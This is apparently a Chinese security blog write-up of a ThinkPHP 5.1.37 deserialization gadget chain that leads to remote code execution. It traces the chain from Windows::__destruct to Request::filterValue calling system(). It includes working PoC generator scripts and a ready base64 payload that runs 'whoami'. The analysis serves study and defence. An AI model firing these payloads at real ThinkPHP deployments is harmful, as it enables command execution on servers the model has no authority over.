# 环境搭建

```
composer create-project topthink/think=5.1.37 v5.1.37
```

版本5.1.37

添加反序列化入口

在`thinkphp\application\index\controller\Index.php`下将代码修改为

```
<?php
namespace app\index\controller;
{

    class Index
    {
       public function index($input='')
        {   
            unserialize(base64_decode($input));
            return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V5.1<br/><span style="font-size:30px">12载初心不改（2006-2018） - 你值得信赖的PHP框架</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
        }
        public function hello($name = 'ThinkPHP5')
        {
           return 'hello,' . $name;
        }
    }
}

```

`php think run`启动thinkphp服务

# 漏洞分析

poc如下

```
<?php
namespace think\process\pipes{
    use think\model\Pivot;
    class Windows{
        private $files = [];
        public function __construct(){
            $this->files[]=new Pivot();
        }
    }
}
namespace think{
    abstract class Model{
        protected $append;
        private $data;
        function __construct(){
            $this->data = ['request'=>new Request()];
            $this->append = ['request' => ''];
            $this->append['request'] = array(
                'aa' => 'aaa'
            );
        }
    }    
}
namespace think\model{
    use think\Model;
    use think\Request;
    class Pivot extends Model{
    }
}
namespace think{
    class Request{
        protected $hook;
        protected $param;
        protected $filter;
        protected $config = [
            // 表单请求类型伪装变量
            'var_method'       => '_method',
            // 表单ajax伪装变量
            'var_ajax'         => '',
            // 表单pjax伪装变量
            'var_pjax'         => '_pjax',
            // PATHINFO变量名 用于兼容模式
            'var_pathinfo'     => 's',
            // 兼容PATH_INFO获取
            'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
            // 默认全局过滤方法 用逗号分隔多个
            'default_filter'   => '',
            // 域名根，如thinkphp.cn
            'url_domain_root'  => '',
            // HTTPS代理标识
            'https_agent_name' => '',
            // IP代理获取标识
            'http_agent_ip'    => 'HTTP_X_REAL_IP',
            // URL伪静态后缀
            'url_html_suffix'  => 'html',
        ];
        public function __construct(){
            $this->hook = ["visible"=>[$this,"isAjax"]];
            $this->param = ['whoami'];
            $this->filter = array('1' => 'system','2' => '2');

        }
    }
}
namespace {
    use think\process\pipes\Windows;
    echo base64_encode(serialize(new Windows));
}
?>

//?input=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo3OiJyZXF1ZXN0IjthOjE6e3M6MjoiYWEiO3M6MzoiYWFhIjt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6NzoicmVxdWVzdCI7TzoxMzoidGhpbmtcUmVxdWVzdCI6NDp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo4O2k6MTtzOjY6ImlzQWpheCI7fX1zOjg6IgAqAHBhcmFtIjthOjE6e2k6MDtzOjY6Indob2FtaSI7fXM6OToiACoAZmlsdGVyIjthOjI6e2k6MTtzOjY6InN5c3RlbSI7aToyO3M6MToiMiI7fXM6OToiACoAY29uZmlnIjthOjEwOntzOjEwOiJ2YXJfbWV0aG9kIjtzOjc6Il9tZXRob2QiO3M6ODoidmFyX2FqYXgiO3M6MDoiIjtzOjg6InZhcl9wamF4IjtzOjU6Il9wamF4IjtzOjEyOiJ2YXJfcGF0aGluZm8iO3M6MToicyI7czoxNDoicGF0aGluZm9fZmV0Y2giO2E6Mzp7aTowO3M6MTQ6Ik9SSUdfUEFUSF9JTkZPIjtpOjE7czoxODoiUkVESVJFQ1RfUEFUSF9JTkZPIjtpOjI7czoxMjoiUkVESVJFQ1RfVVJMIjt9czoxNDoiZGVmYXVsdF9maWx0ZXIiO3M6MDoiIjtzOjE1OiJ1cmxfZG9tYWluX3Jvb3QiO3M6MDoiIjtzOjE2OiJodHRwc19hZ2VudF9uYW1lIjtzOjA6IiI7czoxMzoiaHR0cF9hZ2VudF9pcCI7czoxNDoiSFRUUF9YX1JFQUxfSVAiO3M6MTU6InVybF9odG1sX3N1ZmZpeCI7czo0OiJodG1sIjt9fX19fX0=
```

还是去找的__destruct,定位到了

```
thinkphp/library/think/process/pipes/Windows.php
```

![image-20210818092209923](images/1.png)

这里会调用一个关闭连接的close()方法,不过可以忽略,接下来调用removeFiles()

跟进removeFiles()

![image-20210818092337886](images/2.png)

这里执行的是一个删除任意文件的操作,而且我们$this->files是可控的,那这里应该是存在一个任意文件删除漏洞

看看poc中

```
namespace think\process\pipes{
    use think\model\Pivot;
    class Windows{
        private $files = [];
        public function __construct(){
            $this->files[]=new Pivot();
        }
    }
}
```

`$this->files`被赋值为了Pivot这个类

![image-20210818093602088](images/3.png)

看file_exists()这个函数,里面的参数为被当做字符串执行,而这里又是Pivot这个类,那么就可以去调用其中的__toString魔术方法

可是我并没有在这个类中找的__toString

跟进父类,还是无果,不过还没有结束

看看其父类的引用,去这5个引用里面找一下

![image-20210818093856286](images/4.png)

最后在Conversion这个类里面找到了__toString(),通过poc也可以发现就是这个类

![image-20210818094101608](images/5.png)

跟进toJson()

![image-20210818094125120](images/6.png)

跟进toArray()

```
    public function toArray()
    {
        $item       = [];
        $hasVisible = false;

        foreach ($this->visible as $key => $val) {
            if (is_string($val)) {
                if (strpos($val, '.')) {
                    list($relation, $name)      = explode('.', $val);
                    $this->visible[$relation][] = $name;
                } else {
                    $this->visible[$val] = true;
                    $hasVisible          = true;
                }
                unset($this->visible[$key]);
            }
        }

        foreach ($this->hidden as $key => $val) {
            if (is_string($val)) {
                if (strpos($val, '.')) {
                    list($relation, $name)     = explode('.', $val);
                    $this->hidden[$relation][] = $name;
                } else {
                    $this->hidden[$val] = true;
                }
                unset($this->hidden[$key]);
            }
        }

        // 合并关联数据
        $data = array_merge($this->data, $this->relation);

        foreach ($data as $key => $val) {
            if ($val instanceof Model || $val instanceof ModelCollection) {
                // 关联模型对象
                if (isset($this->visible[$key]) && is_array($this->visible[$key])) {
                    $val->visible($this->visible[$key]);
                } elseif (isset($this->hidden[$key]) && is_array($this->hidden[$key])) {
                    $val->hidden($this->hidden[$key]);
                }
                // 关联模型对象
                if (!isset($this->hidden[$key]) || true !== $this->hidden[$key]) {
                    $item[$key] = $val->toArray();
                }
            } elseif (isset($this->visible[$key])) {
                $item[$key] = $this->getAttr($key);
            } elseif (!isset($this->hidden[$key]) && !$hasVisible) {
                $item[$key] = $this->getAttr($key);
            }
        }

        // 追加属性（必须定义获取器）
        if (!empty($this->append)) {
            foreach ($this->append as $key => $name) {
                if (is_array($name)) {
                    // 追加关联对象属性
                    $relation = $this->getRelation($key);

                    if (!$relation) {
                        $relation = $this->getAttr($key);
                        if ($relation) {
                            $relation->visible($name);
                        }
                    }

                    $item[$key] = $relation ? $relation->append($name)->toArray() : [];
                } elseif (strpos($name, '.')) {
                    list($key, $attr) = explode('.', $name);
                    // 追加关联对象属性
                    $relation = $this->getRelation($key);

                    if (!$relation) {
                        $relation = $this->getAttr($key);
                        if ($relation) {
                            $relation->visible([$attr]);
                        }
                    }

                    $item[$key] = $relation ? $relation->append([$attr])->toArray() : [];
                } else {
                    $item[$name] = $this->getAttr($name, $item);
                }
            }
        }

        return $item;
    }
```

需要利用到的代码块

![image-20210818094600248](images/7.png)

`$this->append`是可控的,那就可以控制`$key`和`$name`可以进入if

```
foreach ($this->append as $key => $name) 
此时令$this->append=["input"=>["DawnT0wn"]]
那$key="input",$name=["DawnT0wn"]
```

跟进getRelation()

![image-20210818095501329](images/8.png)

此时传入的`$name`其实是之前的`$key`,所以不进入第一个if

array_key_exists()

![image-20210818100536873](images/9.png)

$this->relation的默认值是空数组

所以`$key`也不在`$this->relation`中,所以也不进入else if

最后的返回值为空

跟进getAttr()

![image-20210818100251390](images/10.png)

这里调用了一个getData()

跟进getData()

![image-20210818100350127](images/11.png)

这里的第一个else if中的`$this->data`是可控的,那我就可以控制`$this>data=['input'=>一个带有__call()的类]`,根据poc,这个类就是Request,`$this>data=['input'=>new Request()]`

这样返回值就是`$this->data[$name]`,即new Request()

于是getAttr()的返回值`$value=new Request()`

回到__toString()

![image-20210818101210646](images/12.png)

$relation的值就是一个实例化类,调用里面不存在的函数visible,触发__call

```
thinkphp/library/think/Request.php
```

![image-20210818102601632](images/13.png)

看到这个call_user_func_array()有点和laravel5.4相似差点以为差不多快结束了,谁知才刚刚开始,慢慢来哟

$this->hook是可控的,进入if

 `array_unshift($args, $this);`把`$this`放到`$arg`数组的第一个元素

于是就变成了

```
call_user_func_array([$obj,"任意方法"],[$this,任意参数])
也就是
$obj->$func($this,$argv)
```

这种情况下就很难执行命令了,但也不是毫无办法

看师傅的文章说Thinkphp作为一个web框架,Request类中有一个特殊的功能就是过滤器 filter(ThinkPHP的多个远程代码执行都是出自此处),尝试覆盖filter的方法去执行代码

在Request类中找到了filterValue()

![image-20210818104133224](images/14.png)

看到有个`call_user_func()`,那我就可以通过`__toString()`里面的`call_user_func_array()`回调filterValue()

不过这里的$value目前是不可控的,我必须去找到一个控制点

通过poc看到 `$this->hook = ["visible"=>[$this,"isAjax"]];`

那我就去找找`isAjax()`,跟进`isAjax()`

![image-20210818150330437](images/15.png)

`$ajax`的默认值是false,那就可以执行到`$this->param`,并且$this->config是可控的

跟进param()

```
public function param($name = '', $default = null, $filter = '')
    {
        if (!$this->mergeParam) {
            $method = $this->method(true);

            // 自动获取请求变量
            switch ($method) {
                case 'POST':
                    $vars = $this->post(false);
                    break;
                case 'PUT':
                case 'DELETE':
                case 'PATCH':
                    $vars = $this->put(false);
                    break;
                default:
                    $vars = [];
            }

            // 当前请求参数和URL地址中的参数合并
            $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));

            $this->mergeParam = true;
        }

        if (true === $name) {
            // 获取包含文件上传信息的数组
            $file = $this->file();
            $data = is_array($file) ? array_merge($this->param, $file) : $this->param;

            return $this->input($data, '', $default, $filter);
        }

        return $this->input($this->param, $name, $default, $filter);
    }
```

`$this->input($this->param, $name, $default, $filter)`

在param()函数中的`$this->param`是可控的,只要`$this->mergeParam = true`那就可以不进入if

最后的语句直接是

```
return $this->input($this->param, $name, $default, $filter);
```

跟进input

```
public function input($data = [], $name = '', $default = null, $filter = '')
    {
        if (false === $name) {
            // 获取原始数据
            return $data;
        }

        $name = (string) $name;
        if ('' != $name) {
            // 解析name
            if (strpos($name, '/')) {
                list($name, $type) = explode('/', $name);
            }

            $data = $this->getData($data, $name);

            if (is_null($data)) {
                return $default;
            }

            if (is_object($data)) {
                return $data;
            }
        }

        // 解析过滤器
        $filter = $this->getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, 'filterValue'], $filter);
            if (version_compare(PHP_VERSION, '7.1.0', '<')) {
                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
                $this->arrayReset($data);
            }
        } else {
            $this->filterValue($data, $name, $filter);
        }

        if (isset($type) && $data !== $default) {
            // 强制类型转换
            $this->typeCast($data, $type);
        }

        return $data;
    }
```

input中的`$name`为空字符

![image-20210819142936893](images/16.png)

```
var_dump(''==false);//bool(true)
var_dump(''===false);//bool(false)
```

但是`$name`为空可以绕过前面两个if,就不会执行执行到getData,

$data的值仍然没变,还是whoami

下面这句语句会直接执行的

![image-20210819143418308](images/17.png)

跟进getFilter()

![image-20210819015824452](images/18.png)

这里我们可以在在poc写的时候定义一个$filter,然后将其污染成为'system'

$this->filter='system'即可

![image-20210819144016592](images/19.png)

我们需要的是去调用到filterValue()来控制里面的参数,这里有两种方法可以调用filterValue()

第一种是进入if,使用array_walk_recursive

第二种是使用else里面的filterValue()

因为我这样做的方法$data并不是一个数组,使用直接会调用else里面的filterValue()

再看看filterValue()

![image-20210819102941407](images/20.png)

里面的参数`$value是input()里面的$data`,`$filters是input()里面的$filter`

所以只需要控制`$filter='system',$value='whoami'`

大致利用链

```
1. think\process\pipes\Windows->__destruct()->removeFiles()
2. think\model\concern\Conversion->__toString()->toJson()->toArray()
3. think\Request->__call()->isAjax()->param()->input()->filterValue()->call_user_func()
```

里面还有一些函数来对变量进行赋值

# 漏洞复现

poc

```
<?php
namespace think\process\pipes
{
    use think\model\Pivot;
    class Windows
    {
        private $files=[];
        public function __construct()
        {
            $this->files=[new Pivot()];
        } 
    }
}
namespace think\model
{
    use think\Model;
    use think\Request;
    class Pivot extends Model{
    }
}
namespace think
{
    abstract class Model
    {
        protected $append;
        private $data;
        public function __construct()
        {
            $this->append=["input"=>["DawnT0wn"]];
            $this->data=["input"=>new Request()];
        }
    }
}
namespace think
{
    class Request
    {
        protected $hook;
        protected $config ;
        protected $mergeParam;
        protected $param;
        protected $filter;
        public function __construct()
        {
            $this->hook=["visible"=>[$this,"isAjax"]];
            // $this->config['var_ajax']='DawnT0wn';
            $this->mergeParam=true;
            $this->param=['whoami'];
            $this->filter='system';
        }
    }
}
namespace {
    use think\process\pipes\Windows;
    echo base64_encode(serialize(new Windows()));
}
```

![image-20210819153321824](images/21.png)





# 小结

最近做了有这么多篇漏洞分析了,thinkphp的还是第一篇,感觉还是有一定的难度

如果不是这些大佬们写出来的poc和文章,对这个简直是无从下手,特别是最后去利用filterValue()那里,如果不是对tp框架熟悉的话,根本想不到





参考链接

https://xz.aliyun.com/t/6619#toc-3

https://blog.csdn.net/lllffg/article/details/116145918
